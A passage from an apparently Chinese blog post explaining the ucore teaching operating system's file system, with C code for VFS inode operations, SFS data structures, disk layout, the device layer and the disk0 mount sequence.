= sfs_close,</span><br><span class="line">    .vop_fstat                      = sfs_fstat,</span><br><span class="line">    .vop_fsync                      = sfs_fsync,</span><br><span class="line">    .vop_namefile                   = sfs_namefile,</span><br><span class="line">    .vop_getdirentry                = sfs_getdirentry,</span><br><span class="line">    .vop_reclaim                    = sfs_reclaim,</span><br><span class="line">    .vop_gettype                    = sfs_gettype,</span><br><span class="line">    .vop_lookup                     = sfs_lookup,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// sfs特定的file操作对应于inode上的抽象操作</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inode_ops</span> <span class="title">sfs_node_fileops</span> =</span> &#123;</span><br><span class="line">    .vop_magic                      = VOP_MAGIC,</span><br><span class="line">    .vop_open                       = sfs_openfile,</span><br><span class="line">    .vop_close                      = sfs_close,</span><br><span class="line">    .vop_read                       = sfs_read,</span><br><span class="line">    .vop_write                      = sfs_write,</span><br><span class="line">    .vop_fstat                      = sfs_fstat,</span><br><span class="line">    .vop_fsync                      = sfs_fsync,</span><br><span class="line">    .vop_reclaim                    = sfs_reclaim,</span><br><span class="line">    .vop_gettype                    = sfs_gettype,</span><br><span class="line">    .vop_tryseek                    = sfs_tryseek,</span><br><span class="line">    .vop_truncate                   = sfs_truncfile,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// sfs特定的dev操作对应于inode上的抽象操作</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inode_ops</span> <span class="title">dev_node_ops</span> =</span> &#123;</span><br><span class="line">    .vop_magic                      = VOP_MAGIC,</span><br><span class="line">    .vop_open                       = dev_open,</span><br><span class="line">    .vop_close                      = dev_close,</span><br><span class="line">    .vop_read                       = dev_read,</span><br><span class="line">    .vop_write                      = dev_write,</span><br><span class="line">    .vop_fstat                      = dev_fstat,</span><br><span class="line">    .vop_ioctl                      = dev_ioctl,</span><br><span class="line">    .vop_gettype                    = dev_gettype,</span><br><span class="line">    .vop_tryseek                    = dev_tryseek,</span><br><span class="line">    .vop_lookup                     = dev_lookup,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>目录项（dentry）</strong></li>
</ul>
<p>目录项不是目录，而是目录的组成部分</p>
<p>目录项是描述文件的逻辑属性，只存在于内存中，并没有实际对应的磁盘上的描述，更确切的说是存在于内存的目录项缓存，为了提高查找性能而设计</p>
<ul>
<li>UNIX 中目录被看作一种特定的文件，而目录项是文件路径中的一部分</li>
<li>如一个文件路径名是 “/test/testfile” ，则包含的目录项为：<ul>
<li>根目录 “/” ，目录 “test” 和文件 “testfile” ，这三个都是目录项</li>
</ul>
</li>
<li>一般而言，目录项包含目录项的名字（文件名或目录名）和目录项的索引节点位置</li>
</ul>
<p>注意：目录也是一种文件，所以也存在对应的 inode，打开目录，实际上就是打开对应的目录文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sfs_disk_entry</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> ino;                                   <span class="comment">/* inode编号 */</span></span><br><span class="line">    <span class="keyword">char</span> name[SFS_MAX_FNAME_LEN + <span class="number">1</span>];               <span class="comment">/* 文件名称 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>dentry（具体为struct sfs_disk_entry）就是一个内存实体：其中的 ino 成员指向对应的 inode number，另外一个成员是 file name</p>
<ul>
<li><strong>文件（file）</strong></li>
</ul>
<p>它主要从进程的角度描述了一个进程在访问文件时需要了解的文件标识，文件读写的位置，文件引用情况等信息，它的作用范围是某一具体进程</p>
<p>下面是用于描述文件的结构体：file（又称打开的文件描述）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">        FD_NONE, FD_INIT, FD_OPENED, FD_CLOSED,</span><br><span class="line">    &#125; status;</span><br><span class="line">    <span class="keyword">bool</span> readable; <span class="comment">/* 读权限标记位 */</span></span><br><span class="line">    <span class="keyword">bool</span> writable; <span class="comment">/* 写权限标记位 */</span></span><br><span class="line">    <span class="keyword">int</span> fd; <span class="comment">/* 文件描述符 */</span></span><br><span class="line">    <span class="keyword">off_t</span> pos; <span class="comment">/* 当前读取位置(下一次写入的起始位置) */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">node</span>;</span> <span class="comment">/* 文件系统中与硬盘特定区域所对应的结点(索引节点inode) */</span></span><br><span class="line">    <span class="keyword">int</span> open_count; <span class="comment">/* 打开的引用次数 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>上面的 file 只是对一个文件而言，对于一个进程(用户)来说，可以同时处理多个文件，所以需要另一个结构来管理所有的 files：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">pwd</span>;</span>      <span class="comment">// 当前工作目录的inode</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">fd_array</span>;</span>  <span class="comment">// 打开的文件数组(存放file结构体)</span></span><br><span class="line">    <span class="keyword">int</span> files_count;        <span class="comment">// 打开的文件数</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> files_sem;  <span class="comment">// 对应的信号量</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="文件系统-文件系统层"><a href="#文件系统-文件系统层" class="headerlink" title="文件系统-文件系统层"></a>文件系统-文件系统层</h2><p>从 VFS 向下一层，就是 SFS（Simple FS，文件系统层，简称 SFS）</p>
<p>ucore 内核把所有文件都看作是字节流，任何内部逻辑结构都是专用的，由应用程序负责解释，但是 ucore 区分文件的物理结构，ucore 目前支持如下几种类型的文件： </p>
<ul>
<li>常规文件：文件中包括的内容信息是由应用程序输入，SFS 文件系统在普通文件上不强加任何内部结构，把其文件内容信息看作为字节</li>
<li>目录：包含一系列的 entry，每个 entry 包含文件名和指向与之相关联的索引节点（index node）的指针，目录是按层次结构组织的</li>
<li>链接文件：实际上一个链接文件是一个已经存在的文件的另一个可选择的文件名</li>
<li>设备文件：不包含数据，但是提供了一个映射物理设备（如串口、键盘等）到一个文件名的机制，可通过设备文件访问外围设备</li>
<li>管道：管道是进程间通讯的一个基础设施，管道缓存了其输入端所接受的数据，以便在管道输出端读的进程能一个先进先出的方式来接受数据</li>
</ul>
<p>SFS 文件系统中目录和常规文件具有共同的属性，而这些属性保存在索引节点中，SFS 通过索引节点来管理目录和常规文件，索引节点包含操作系统所需要的关于某个文件的关键信息，比如文件的属性、访问许可权以及其它控制信息都保存在索引节点中</p>
<p><strong>函数接口与数据结构</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sfs_init</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sfs_mount</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *devname)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lock_sfs_fs</span><span class="params">(struct sfs_fs *sfs)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lock_sfs_io</span><span class="params">(struct sfs_fs *sfs)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlock_sfs_fs</span><span class="params">(struct sfs_fs *sfs)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlock_sfs_io</span><span class="params">(struct sfs_fs *sfs)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sfs_rblock</span><span class="params">(struct sfs_fs *sfs, <span class="keyword">void</span> *buf, <span class="keyword">uint32_t</span> blkno, <span class="keyword">uint32_t</span> nblks)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sfs_wblock</span><span class="params">(struct sfs_fs *sfs, <span class="keyword">void</span> *buf, <span class="keyword">uint32_t</span> blkno, <span class="keyword">uint32_t</span> nblks)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sfs_rbuf</span><span class="params">(struct sfs_fs *sfs, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">uint32_t</span> blkno, <span class="keyword">off_t</span> offset)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sfs_wbuf</span><span class="params">(struct sfs_fs *sfs, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">uint32_t</span> blkno, <span class="keyword">off_t</span> offset)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sfs_sync_super</span><span class="params">(struct sfs_fs *sfs)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sfs_sync_freemap</span><span class="params">(struct sfs_fs *sfs)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sfs_clear_block</span><span class="params">(struct sfs_fs *sfs, <span class="keyword">uint32_t</span> blkno, <span class="keyword">uint32_t</span> nblks)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sfs_load_inode</span><span class="params">(struct sfs_fs *sfs, struct inode **node_store, <span class="keyword">uint32_t</span> ino)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">sfs_sync</span><span class="params">(struct fs *fs)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> struct inode* <span class="title">sfs_get_root</span><span class="params">(struct fs *fs)</span> </span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">sfs_unmount</span><span class="params">(struct fs *fs)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sfs_cleanup</span><span class="params">(struct fs *fs)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">fs_init_read</span><span class="params">(struct device *dev, <span class="keyword">uint32_t</span> blkno, <span class="keyword">void</span> *blk_buffer)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">fs_do_mount</span><span class="params">(struct device *dev, struct fs **fs_store)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* PS：函数定义多的一批，这里就不挂了 */</span></span><br></pre></td></tr></table></figure>
<p>在 <code>SFS</code> 中涉及到了两种文件系统结构，分别是 <code>fs</code> 和 <code>sfs_fs</code> </p>
<ul>
<li><code>fs</code> 结构是我们 <strong>在上层函数调用中所直接操作</strong> 的抽象文件系统结构</li>
<li><code>sfs_fs</code> 结构则是 <strong>在下层函数中所使用的</strong></li>
</ul>
<p>在原先 <code>sfs_fs</code> 上抽象出一层 <code>fs</code> 结构有助于忽略不同文件系统的差异，其实现如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs</span> &#123;</span> <span class="comment">/* 上层函数直接操作 */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sfs_fs</span> __<span class="title">sfs_info</span>;</span>                   </span><br><span class="line">    &#125; fs_info;                                     <span class="comment">// 特定于文件系统的数据</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">        fs_type_sfs_info,</span><br><span class="line">    &#125; fs_type;                                     <span class="comment">// 文件系统的类型</span></span><br><span class="line">    <span class="keyword">int</span> (*fs_sync)(struct fs *fs);                 <span class="comment">// 将所有脏缓冲区刷新到磁盘</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *(*<span class="title">fs_get_root</span>)(<span class="keyword">struct</span> <span class="title">fs</span> *<span class="title">fs</span>);</span>   <span class="comment">// 返回文件系统的根索引节点</span></span><br><span class="line">    <span class="keyword">int</span> (*fs_unmount)(struct fs *fs);              <span class="comment">// 尝试卸载文件系统</span></span><br><span class="line">    <span class="keyword">void</span> (*fs_cleanup)(struct fs *fs);             <span class="comment">// 清理文件系统</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sfs_fs</span> &#123;</span> <span class="comment">/* 对接下层函数 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sfs_super</span> <span class="title">super</span>;</span>                         <span class="comment">/* 磁盘上超级块 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span>                             <span class="comment">/* 指向设备安装位置 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bitmap</span> *<span class="title">freemap</span>;</span>                         <span class="comment">/* 正在使用的块被标记为&#x27;0&#x27; */</span></span><br><span class="line">    <span class="keyword">bool</span> super_dirty;                               <span class="comment">/* 是否修改了super/freemap */</span></span><br><span class="line">    <span class="keyword">void</span> *sfs_buffer;                               <span class="comment">/* 用于non-block对齐的缓冲区 */</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> fs_sem;                             <span class="comment">/* fs的信号量 */</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> io_sem;                             <span class="comment">/* io的信号量 */</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> mutex_sem;                          <span class="comment">/* 用于链接/取消链接和重命名的信号量 */</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> inode_list;                        <span class="comment">/* 索引节点链表(inode链表) */</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> *hash_list;                        <span class="comment">/* 索引节点哈希链表 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>sfs_fs</code> 结构中包含了底层设备的超级块 <code>superblock</code> 、所挂载的设备 <code>dev</code> 、以及底层设备中用于表示空间分配情况的 <code>freemap</code> 等</li>
</ul>
<p><strong>文件系统布局</strong> </p>
<p>文件系统通常保存在磁盘上</p>
<p>在本实验中，第三个磁盘（即 disk0，前两个磁盘分别是 ucore.img 和 swap.img）用于存放一个SFS文件系统（Simple Filesystem），通常文件系统中，磁盘的使用是以扇区（Sector）为单位的，但是为了实现简便，SFS 中以 block （4K，与内存 page 大小相等）为基本单位</p>
<p>SFS文件系统的布局如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+------------+----------+---------+-------------------------------------+</span><br><span class="line">| superblock | root-dir | freemap | Inode / File Data / Dir Data blocks |</span><br><span class="line">+------------+----------+---------+-------------------------------------+</span><br></pre></td></tr></table></figure>
<ul>
<li>第0个块是超级块（superblock）<ul>
<li>它包含了关于文件系统的所有关键参数，当计算机被启动或文件系统被首次接触时，超级块的内容就会被装入内存</li>
</ul>
</li>
<li>第1个块放了一个 root-dir 的 inode，用来记录根目录的相关信息<ul>
<li>root-dir 是 SFS 文件系统的根结点</li>
<li>通过这个 root-dir 的 inode 信息就可以定位并查找到根目录下的所有文件信息</li>
</ul>
</li>
<li>从第2个块开始，根据 SFS 中所有块的数量，用1个bit来表示一个块的占用和未被占用的情况<ul>
<li>这个区域称为 SFS 的 freemap 区域，这将占用若干个块空间（为了更好地记录和管理 freemap 区域）</li>
</ul>
</li>
<li>最后在剩余的磁盘空间中，存放了所有其他目录和文件的inode信息和内容数据信息<ul>
<li>需要注意的是：虽然 inode 的大小小于一个块的大小（4096B），但为了实现简单，每个 inode 都占用一个完整的 block</li>
</ul>
</li>
</ul>
<h2 id="文件系统-外设接口层"><a href="#文件系统-外设接口层" class="headerlink" title="文件系统-外设接口层"></a>文件系统-外设接口层</h2><p>再底层一点就是 I/O 设备的相关实现，例如结构体 <code>device</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">device</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> d_blocks;</span><br><span class="line">    <span class="keyword">size_t</span> d_blocksize;</span><br><span class="line">    <span class="keyword">int</span> (*d_open)(struct device *dev, <span class="keyword">uint32_t</span> open_flags);</span><br><span class="line">    <span class="keyword">int</span> (*d_close)(struct device *dev);</span><br><span class="line">    <span class="keyword">int</span> (*d_io)(struct device *dev, struct iobuf *iob, <span class="keyword">bool</span> write);</span><br><span class="line">    <span class="keyword">int</span> (*d_ioctl)(struct device *dev, <span class="keyword">int</span> op, <span class="keyword">void</span> *data);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>该结构体支持对块设备、字符设备的表示，完成对设备的基本操作</p>
<p><strong>结构体 device 只表示了一个设备所能使用的功能，我们需要一个数据结构用于将 device 和 fs 关联</strong>，同时，为了将连接的所有设备连接在一起，uCore定义了一个链表，通过该链表即可访问到所有设备，而这就是定义 <code>vfs_dev_t</code> 结构体的目的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *devname; <span class="comment">/* 结构体device的名称 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">devnode</span>;</span> <span class="comment">/* 结构体device的索引节点(inode) */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fs</span> *<span class="title">fs</span>;</span> <span class="comment">/* 被关联的fs结构(上层函数直接操作的接口) */</span></span><br><span class="line">    <span class="keyword">bool</span> mountable;</span><br><span class="line">    <span class="keyword">list_entry_t</span> vdev_link; <span class="comment">/* vdev链表 */</span></span><br><span class="line">&#125; <span class="keyword">vfs_dev_t</span>;</span><br></pre></td></tr></table></figure>
<h2 id="文件系统挂载流程"><a href="#文件系统挂载流程" class="headerlink" title="文件系统挂载流程"></a>文件系统挂载流程</h2><p>一个文件系统在使用前，需要将其挂载至内核中（使一个存储设备上的计算机文件和目录，可供用户通过计算机的文件系统访问的一个过程），在 uCore 里，硬盘 <code>disk0</code> 的挂载流程如下：</p>
<p>程序会先执行 fs_init 函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">fs_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    vfs_init(); <span class="comment">/* 初始化vfs虚拟文件系统 */</span></span><br><span class="line">    dev_init(); <span class="comment">/* 初始化dev外设接口层 */</span></span><br><span class="line">    sfs_init(); <span class="comment">/* 初始化sfs文件系统 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>vfs_init：初始化 vfs 虚拟文件系统 </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">semaphore_t</span> bootfs_sem; <span class="comment">/* fs文件系统的信号量 */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">semaphore_t</span> vdev_list_sem; <span class="comment">/* vdev链表的信号量 */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">list_entry_t</span> vdev_list; <span class="comment">/* vdev链表头 */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">vfs_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    sem_init(&amp;bootfs_sem, <span class="number">1</span>); <span class="comment">/* 初始化fs信号量 */</span></span><br><span class="line">    vfs_devlist_init(); <span class="comment">/* 初始化vdev结构体 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">vfs_devlist_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    list_init(&amp;vdev_list); <span class="comment">/* 初始化vdev链表 */</span></span><br><span class="line">    sem_init(&amp;vdev_list_sem, <span class="number">1</span>); <span class="comment">/* 初始化vdev链表信号量 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">sem_init</span><span class="params">(<span class="keyword">semaphore_t</span> *sem, <span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">    sem-&gt;value = value; <span class="comment">/* 初始化value(信号量关键整数) */</span></span><br><span class="line">    wait_queue_init(&amp;(sem-&gt;wait_queue)); <span class="comment">/* 初始化信号量等待队列 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>dev_init：初始化 dev 外设接口层</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">dev_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    init_device(<span class="built_in">stdin</span>);</span><br><span class="line">    init_device(<span class="built_in">stdout</span>);</span><br><span class="line">    init_device(disk0); <span class="comment">/* 我们只关注这一个 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> init_device(x)                                  \</span></span><br><span class="line"><span class="meta">    do &#123;                                                \</span></span><br><span class="line"><span class="meta">        extern void dev_init_##x(void);                 \</span></span><br><span class="line"><span class="meta">        dev_init_##x();                                 \</span></span><br><span class="line"><span class="meta">    &#125; while (0) <span class="comment">/* 这个循环八成是为了效率 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">dev_init_disk0</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123; <span class="comment">/* 初始化disk0(超级块) */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">node</span>;</span></span><br><span class="line">    <span class="keyword">if</span> ((node = dev_create_inode()) == <span class="literal">NULL</span>) &#123; <span class="comment">/* 为dev创建inode */</span></span><br><span class="line">        panic(<span class="string">&quot;disk0: dev_create_node.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    disk0_device_init(vop_info(node, device)); <span class="comment">/* 根据inode初始化dev */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">if</span> ((ret = vfs_add_dev(<span class="string">&quot;disk0&quot;</span>, node, <span class="number">1</span>)) != <span class="number">0</span>) &#123; <span class="comment">/* 把该dev添加到vdev链表 */</span></span><br><span class="line">        panic(<span class="string">&quot;disk0: vfs_add_dev: %e.\n&quot;</span>, ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>sfs_init：初始化 sfs 文件系统</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">sfs_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">if</span> ((ret = sfs_mount(<span class="string">&quot;disk0&quot;</span>)) != <span class="number">0</span>) &#123; <span class="comment">/* 挂载sfs文件系统 */</span></span><br><span class="line">        panic(<span class="string">&quot;failed: sfs: sfs_mount: %e.\n&quot;</span>, ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">sfs_mount</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *devname)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> vfs_mount(devname, sfs_do_mount); <span class="comment">/* 挂载vfs虚拟文件系统 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">vfs_mount</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *devname, <span class="keyword">int</span> (*mountfunc)(struct device *dev, struct fs **fs_store))</span> </span>&#123; <span class="comment">/* 执行完毕后,文件系统就成功挂载了 */</span></span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    lock_vdev_list();</span><br><span class="line">    <span class="keyword">vfs_dev_t</span> *vdev;</span><br><span class="line">    <span class="keyword">if</span> ((ret = find_mount(devname, &amp;vdev)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (vdev-&gt;fs != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        ret = -E_BUSY;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    assert(vdev-&gt;devname != <span class="literal">NULL</span> &amp;&amp; vdev-&gt;mountable);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span 